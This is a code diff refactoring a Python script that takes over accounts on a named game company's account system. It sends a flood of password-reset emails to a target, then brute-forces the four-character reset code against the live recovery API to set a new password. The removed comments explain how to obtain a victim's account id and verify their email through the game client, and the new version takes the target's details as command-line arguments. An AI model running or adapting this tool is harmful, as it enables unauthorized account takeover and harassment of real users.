@@ -1,44 +1,28 @@
 import asyncio
-from itertools import product
-import httpx
-from string import ascii_uppercase, digits
-from tqdm import tqdm
-from loguru import logger
 from asyncio import Semaphore
+from itertools import product
+from string import ascii_uppercase, digits
 
-# To take over an account, you need their account-id/public-id AND their email address
-# Not all accounts are vulnerable to this attack, accounts that are made through steam will not work!
-# This is because steam accounts are made through the steam client, and not through the freejam account system.
-# You need to find the public-id/account-id and the email of an account that you want to take over.
-# You can find the public-id/account-id in various places, but you need to find them yourself :p
-# For the email, the best way I found is guessing and verifying it through the friend add function in the game client.
-# (You enter an email address, and the game client will tell you if it's linked to an account or not)\
-# This program takes roughly 1minute-5hours to complete.
-max_concurrent_requests = 20  # How many requests are allowed to be sent at the same time, lower this number if you have a slow internet connection
-password_reset_emails = 100  # How many emails are sent to reset the password (speeds up the process, but it also sends more emails to the owner)
-account_id = ""  # You need to find this id (looks mostly like this ecad4d29-e822-4848-aa9d-9468397c8fa8 but can also be a normal name)
-name = "MyTestAccount"  # Name is not needed, but it's nice to have if you run multiple instances.
-email = ""  # You need to find the email
-password = "XDLiyLE7mdiRj!"  # You choose the new password
-possible_chars = ascii_uppercase + digits  # All possible characters for the reset code
+import httpx
+from httpx import Response
+from loguru import logger
+from tqdm import tqdm
 
 recovery_url = "https://account.freejamgames.com/api/recovery/email"
 password_change_url = "https://account.freejamgames.com/api/recovery/email/finish"
-recovery_body = {
-    "EmailAddress": email
-}
-pbar = tqdm(total=len(possible_chars) ** 4)
-failed = []
-logger.remove()
-logger.add(lambda msg: tqdm.write(msg, end=""), colorize=True)
+possible_chars = ascii_uppercase + digits
+all_possible_codes = (a + b + c + d for a, b, c, d in product(possible_chars, repeat=4))
 
 
-async def send_recovery(client, semaphore):
+async def send_recovery(email: str, client: httpx.AsyncClient, semaphore: Semaphore) -> Response:
+    recovery_body = {
+        "EmailAddress": email
+    }
     async with semaphore:
-        await client.post(recovery_url, json=recovery_body)
+        return await client.post(recovery_url, json=recovery_body)
 
 
-async def bruteforce(client, recovery_code: str, semaphore) -> str:
+async def bruteforce(account_id: str, password: str, client, recovery_code: str) -> str:
     res = ""
     data = {
         "PublicId": account_id,
@@ -46,65 +30,66 @@ async def bruteforce(client, recovery_code: str, semaphore) -> str:
         "Password": password
     }
 
-    try:
-        r = await client.post(url=password_change_url, json=data)
-        if r.status_code == 200:
-            res = recovery_code
-        else:
-            pass
-    except Exception as e:
-        logger.error(f"Tried {recovery_code}: {e}")
-        failed.append(recovery_code)
-        pbar.postfix = f"Failed: {len(failed)}"
+    r = await client.post(url=password_change_url, json=data)
+    if r.status_code == 200:
+        res = recovery_code
 
-    semaphore.release()
     return res
 
 
-async def main():
-    logger.info(f"Starting takeover for {name}")
-    semaphore = Semaphore(max_concurrent_requests)
-    recover_semaphore = Semaphore(5)
-    client = httpx.AsyncClient()
-    await asyncio.gather(*[send_recovery(client, recover_semaphore) for _ in range(password_reset_emails)])
-    logger.info(f"Sent {password_reset_emails} recovery emails")
-    all_possible_codes = (a + b + c + d for a, b, c, d in product(possible_chars, repeat=4))
+async def main(email: str, account_id: str, new_password: str, max_concurrent_brute_requests: int, max_concurrent_email_requests: int, password_reset_emails: int):
+    fail_counter = 0
     success_code = ""
-    running_tasks = []
+    brute_semaphore = Semaphore(max_concurrent_brute_requests)
+    recover_semaphore = Semaphore(max_concurrent_email_requests)
+    client = httpx.AsyncClient()
+    logger.remove()
+    pbar = tqdm(total=len(possible_chars) ** 4)
+    logger.add(lambda msg: pbar.write(msg, end=""), colorize=True)
+    logger.info(f"Starting takeover for {email}")
+    await asyncio.gather(*[send_recovery(email, client, recover_semaphore) for _ in range(password_reset_emails)])
+    logger.info(f"Sent {password_reset_emails} recovery emails to {email}")
     logger.info("Starting bruteforce")
-    for i, possible_code in enumerate(all_possible_codes):
-        await semaphore.acquire()
-        pbar.desc = f"{possible_code}"
-        running_tasks.append(asyncio.create_task(bruteforce(client, possible_code, semaphore)))
-        pbar.update(1)
-        _running_tasks = []
-        for task in running_tasks:
-            if task.done():
-                code = task.result()
-                if code:
-                    logger.info(f"Found code: {code}")
-                    success_code = code
-                    break
-            else:
-                _running_tasks.append(task)
-        running_tasks = _running_tasks
 
+    def bruteforce_callback(fut: asyncio.Future):
+        if not fut.cancelled():
+            if fut.exception():
+                nonlocal fail_counter
+                fail_counter += 1
+                pbar.postfix = f"Failed: {fail_counter}"
+            elif fut.result():
+                nonlocal success_code
+                success_code = fut.result()
+            pbar.update(1)
+            brute_semaphore.release()
+
+    for possible_code in all_possible_codes:
+        await brute_semaphore.acquire()
+        pbar.desc = possible_code
+        task = asyncio.create_task(bruteforce(account_id, new_password, client, possible_code), name=f"Bruteforce-{possible_code}")
+        task.add_done_callback(bruteforce_callback)
         if success_code:
             break
-    for task in running_tasks:
-        task.cancel()
-    if success_code:
-        logger.info("Done")
-        logger.success(f"Success code is {success_code}. Password is now {password}, closing")
-    else:
-        logger.error("Failed")
-        logger.error(f"Failed codes: {failed}")
-    await asyncio.sleep(5)
     await client.aclose()
+    pbar.close()
+    for task in asyncio.all_tasks():
+        if task.get_name().startswith("Bruteforce"):
+            task.cancel()
+    if success_code:
+        logger.success(f"Success code is {success_code}. Password is now {new_password}, closing")
+    else:
+        logger.error(f"Failed to find a success code. {fail_counter} attempts failed")
 
 
 if __name__ == "__main__":
-    try:
-        asyncio.run(main())
-    except:
-        logger.info(f"Got to {pbar.n}, Exiting")
+    import argparse
+
+    my_parser = argparse.ArgumentParser()
+    my_parser.add_argument("-e", "--email", type=str, required=True, help="The email of the target account")
+    my_parser.add_argument("-i", "--account_id", type=str, required=True, help="The account id of the target account")
+    my_parser.add_argument("-p", "--new_password", type=str, default="XDLiyLE7mdiRj!", help="The new password to set")
+    my_parser.add_argument("-b", "--max_concurrent_brute_requests", type=int, default=20, help="The maximum number of concurrent requests to make when bruteforcing")
+    my_parser.add_argument("-c", "--max_concurrent_email_requests", type=int, default=5, help="The maximum number of concurrent requests to make when sending recovery emails")
+    my_parser.add_argument("-r", "--password_reset_emails", type=int, default=100, help="The number of emails to send to reset the password, higher number -> higher speed")
+    args = my_parser.parse_args()
+    asyncio.run(main(**vars(args)))
